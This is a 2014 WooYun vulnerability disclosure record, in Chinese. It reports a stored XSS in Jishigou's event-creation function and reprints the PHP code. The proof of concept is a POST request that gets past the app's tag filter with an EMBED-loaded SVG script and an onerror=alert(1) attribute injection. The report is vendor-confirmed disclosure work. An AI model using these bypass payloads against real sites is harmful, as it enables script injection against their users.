{"id": 55154, "wybug_id": "wooyun-2014-062059", "wybug_title": "记事狗过滤不严导致存储型XSS", "wybug_corp": "杭州神话", "wybug_author": "BadCat", "wybug_date": "2014-05-26 11:56", "wybug_open_date": "2014-08-24 11:58", "wybug_type": "xss跨站脚本攻击", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["持久型", "存储型", "第三方不可信程序", "源码审核"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-05-26：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-05-27：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-05-30：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-07-21：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-07-31：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-08-10：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-08-24：\t细节向公众公开  简要描述： 记事狗某函数过滤不严导致的存储型XSS因为太多奇艳的绕过方式了 详细说明：  问题出于 /jishigou/modules/ajax/event.mod.php 的 create()函数 （创建活动的函数)这里直接贴完整个函数的代码\nfunction create(){                if(!($this->MemberHandler->HasPermission($this->Module,$this->Code)))        {            json_error($this->MemberHandler->GetError());        }\t\t$post = $this->Post;\t\t$post['name'] = jpost('name', 'txt');\t    if(!$post['name']){\t    \tjson_error(\"请输入活动标题\");\t    }\t    $f_rets = filter($post['name']);\t\tif($f_rets && $f_rets['error']){\t\t\tjson_error(\"活动标题\".$f_rets['msg']);\t\t}\t\tif(!$post['content1']){\t    \tjson_error(\"请输入活动描述\");\t    }\t    $f_rets = filter($post['content1']);\t    if($f_rets && $f_rets['error']){\t\t\tjson_error(\"活动描述\".$f_rets['msg']);\t\t}\t\t$post['address'] = jpost('address', 'txt');\t\tif(!$post['address']){\t    \tjson_error(\"请输入活动地址\");\t    }\t    $f_rets = filter($post['address']);\t    if($f_rets && $f_rets['error']){\t\t\tjson_error(\"活动地址\".$f_rets['msg']);\t\t}\t\tif($post['money_r'] == 'money' && !$post['money']){\t    \tjson_error(\"请输入活动人均费用\");\t    }\t    if($post['money_r'] == 'money' && !is_numeric($post['money'])){\t    \tjson_error(\"活动人均费用应为数字\");\t    }\t\tif($post['qua']=='qua' && $post['fans'] && !is_numeric($post['fans_num'])){\t    \tjson_error(\"粉丝数应为数字\");\t    }\t\tif(!$post['fromt']){\t    \tjson_error(\"请输入活动开始时间\");\t    }\t\tif(!$post['tot']){\t    \tjson_error(\"请输入活动结束时间\");\t    }\t    if(!$post['hid_pic']){\t    \tjson_error(\"请上传活动海报\");\t    }\t    \t    $fromt = strtotime($post['fromt'].\" \".$post['hour_select_from'].\":\".$post['min_select_from']);\t    $tot = strtotime($post['tot'].\" \".$post['hour_select_to'].\":\".$post['min_select_to']);\t\tif($fromt >= $tot){\t    \tjson_error(\"活动结束时间不能早于开始时间\");\t    }\t    $verify = $this->Config['event_verify'] ? 0 : 1;\t    load::logic('event');\t    $eventLogic = new EventLogic();\t\t\t\tif (MEMBER_ROLE_TYPE != 'admin') {\t\t\t$is_allowed = $eventLogic->allowedCreate(MEMBER_ID,$this->Member);\t\t}\t\tif($is_allowed){\t\t\tjson_error($is_allowed);\t\t}\t    $item = get_param('item');\t    $item_id = (int) get_param('item_id');\t    $return = $eventLogic->createEvent($post,$item,$item_id,$verify);\t    if(is_array($return)){\t    \tif($return) {\t    \t\tjson_result(\"修改成功\",$return);\t    \t} else {\t    \t\tjson_error('修改失败');\t    \t}\t    }else{\t    \t$id = $return;\t    }\t    if(0 == $verify){\t    \tjson_error('发布成功，等待管理员审核');\t    }\t    $value = '我发布了一个活动【'.$post[name].'】，地址：' . get_full_url($this->Config['site_url'],\"index.php?mod=event&code=detail&id=$id\");\t    if($post['top'] == 'top'){\t\t\t$values = array(\t\t\t\t\t'id' => $id,\t\t\t\t\t'content' => $value,\t\t\t\t\t'from' => '',\t\t\t\t);\t\t\tjson_result('发布成功', $values);\t\t}\t\t$item_id = $id;\t\t$msg = '发布成功';\t\tinclude(template('vote/vote_toweibo'));\t\texit;\t}\n$post 即代表 $_POST全部变量都有经过  jpost的处理 (进行htmlspecialchars, strip_tag)唯有 $f_rets 变量只进行了filter函数的处理 ($_POST['content1'])filter函数我们来看看～由于代码太长我就不贴了filter 函数主要是过滤了 <script><iframe><style><link><meta> 的HTML标签过后又调用了 remove_xss 函数来进行过滤remove_xss把javascript, vbscript, meta, script, object, iframe, frame, frameset, base等HTML标签给过滤掉了而且还把全部的 onerror之类的东西给过滤了但总还是有办法的，我来贴出POC （感觉我在长篇大论）对 http://localhost/jishigou/ajax.php?mod=event&code=create 发出POST请求\nname=blablabla&content1=<EMBED SRC=\"http://localhost/aaa.html\" type=\"image/svg+xml\"></EMBED>&address=aaa&money_r=money&money=1&fans=1&fromt=2014-05-21&tot=2014-05-29&hid_pic=aaa\"onerror=alert(1)&hour_select_from=20&min_select_from=49&hour_select_to=20&min_select_to=49\nfromt 是开始日期hour_select_from 是开始日期的小时min_select_from 是开始日期的分钟，其他不用说了吧content1 我设置成了 <EMBED SRC=\"http://localhost/aaa.html\" type=\"image/svg+xml\"></EMBED>SRC需放你的平台的个HTML文件...http://localhost/aaa.html的源码是\n<svg xmlns:svg=\"http://www.w3.org/2000/svg\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" version=\"1.0\" x=\"0\" y=\"0\" width=\"194\" height=\"200\" id=\"xss\"><script type=\"text/ecmascript\">alert(\"XSS\");</script></svg>\n   漏洞证明：  GOOGLE CHROME和IE触发，但是FIREFOX没触发\n\n   修复方案：  用bbcode之类的东西吧   版权声明：转载请注明来源 BadCat@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2014-05-27 16:59 厂商回复： 非常感谢 BadCat@乌云 的反馈 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}